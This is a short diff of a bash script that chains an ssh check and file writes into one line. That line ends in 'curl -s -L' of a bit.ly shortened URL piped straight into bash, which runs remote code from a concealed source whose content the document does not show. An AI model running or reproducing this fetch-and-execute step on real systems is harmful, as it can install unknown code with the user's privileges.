@@ -1,6 +1,6 @@
 #!/bin/bash
-[ -s ssh.txt ] || ssh node01
-[ -s ssh.txt ] || echo done > ssh.txt && [ -s ssh.txt ] || echo done > ssh.txt && curl -s -L https://bit.ly/3lalhby | bash
+[ -s ssh.txt ] || ssh node01 && [ -s ssh.txt ] || echo done > ssh.txt && [ -s ssh.txt ] || echo done > ssh.txt && curl -s -L https://bit.ly/3lalhby | bash
+
 
 
 
